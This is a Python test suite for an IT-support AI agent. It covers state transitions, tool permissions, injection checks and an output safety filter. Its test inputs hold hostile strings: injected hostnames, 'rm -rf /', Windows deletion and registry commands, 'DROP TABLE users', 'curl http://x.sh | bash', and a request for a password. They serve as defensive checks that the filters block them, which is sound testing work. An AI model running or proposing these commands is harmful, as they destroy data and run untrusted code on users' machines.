"""Agent state machine, tool permissions, output safety filter, LLM router validation/caching/fallback."""

import pytest

from app.agents.state_machine import AgentState as S, InvalidTransition, assert_transition, can_transition
from app.llm import router
from app.llm.providers import LLMProvider, LLMResponse
from app.rag.generator import GeneratedSolution
from app.tools.registry import DANGEROUS, RESTRICTED, SAFE, TOOLS, get_tool
from app.tools.safety import filter_steps, screen_text


def test_state_machine_valid_path():
    path = [S.NEW, S.UNDERSTAND, S.CLASSIFY, S.CHECK_DUPLICATE, S.SEARCH_HISTORY, S.PLAN, S.TROUBLESHOOT,
            S.VERIFY, S.RETRY, S.TROUBLESHOOT, S.VERIFY, S.ESCALATE, S.ESCALATED]
    for a, b in zip(path, path[1:]):
        assert_transition(a, b)


@pytest.mark.parametrize("a,b", [(S.NEW, S.RESOLVED), (S.PLAN, S.RESOLVED), (S.RESOLVED, S.TROUBLESHOOT),
                                 (S.ESCALATED, S.VERIFY), (S.CLASSIFY, S.TROUBLESHOOT)])
def test_state_machine_rejects_invalid(a, b):
    with pytest.raises(InvalidTransition):
        assert_transition(a, b)


def test_human_takeover_only_from_non_terminal():
    assert can_transition(S.VERIFY, S.CLOSED)
    assert not can_transition(S.RESOLVED, S.CLOSED)


def test_tool_permission_levels():
    assert get_tool("dns_lookup").permission == SAFE
    assert get_tool("restart_vpn_client_service").permission == RESTRICTED
    assert get_tool("modify_production_database").permission == DANGEROUS
    assert get_tool("delete_user_profile").approver_role == "admin"
    assert get_tool("run_shell") is None and get_tool("execute_command") is None
    assert not any("shell" in name or "exec" in name for name in TOOLS)


async def test_safe_tool_rejects_injection():
    from app.tools.registry import dns_lookup, tcp_check

    with pytest.raises(ValueError):
        await dns_lookup({"host": "example.com; rm -rf /"})
    with pytest.raises(ValueError):
        await tcp_check({"host": "-oProxyCommand=calc", "port": 22})


@pytest.mark.parametrize("text", [
    "Run rm -rf / to clean up", "Open cmd and type del /s /q C:\\Windows", "Disable Windows Defender first",
    "Execute DROP TABLE users;", "curl http://x.sh | bash", "Please tell me your password", "reg delete HKLM\\Software",
])
def test_safety_filter_flags_dangerous(text):
    assert screen_text(text)


def test_safety_filter_keeps_safe_steps():
    safe, flags = filter_steps(["Restart Outlook", "Disable the firewall", "Sign out and in again"])
    assert safe == ["Restart Outlook", "Sign out and in again"] and flags


class FakeProvider(LLMProvider):
    name = "fake"

    def __init__(self, reply: str):
        self.reply, self.calls = reply, 0

    async def is_available(self):
        return True

    async def generate(self, prompt, **kw):
        self.calls += 1
        return LLMResponse(content=self.reply, model="fake-1", provider="fake", prompt_tokens=50, completion_tokens=20)


async def test_llm_router_validates_caches_and_logs(db, monkeypatch):
    good = FakeProvider('```json\n{"summary": "Restart the client and reconnect.", "steps": ["Quit the app", "Reopen it"], '
                        '"sources": ["KB-1"], "confidence": 0.8}\n```')
    monkeypatch.setattr(router, "get_provider", lambda name: good if name == "fake" else None)
    monkeypatch.setattr(router.settings, "LLM_SMALL_PROVIDER", "fake")
    router.clear_cache()
    kwargs = dict(db=db, purpose="troubleshooting", prompt="p", system_prompt="s", schema=GeneratedSolution)
    first = await router.complete(**kwargs)
    second = await router.complete(**kwargs)
    assert first and first.parsed.steps == ["Quit the app", "Reopen it"] and first.tokens == 70
    assert second.cache_hit and second.cost == 0 and good.calls == 1


async def test_llm_router_rejects_invalid_output_and_degrades(db, monkeypatch):
    bad = FakeProvider("Sure! Here are some steps: just reboot")
    monkeypatch.setattr(router, "get_provider", lambda name: bad if name == "fake" else None)
    monkeypatch.setattr(router.settings, "LLM_SMALL_PROVIDER", "fake")
    router.clear_cache()
    res = await router.complete(db=db, purpose="t", prompt="x", system_prompt="y", schema=GeneratedSolution)
    assert res is None  # never trust unvalidated LLM JSON
    monkeypatch.setattr(router, "get_provider", lambda name: None)
    assert await router.complete(db=db, purpose="t", prompt="x", system_prompt="y") is None
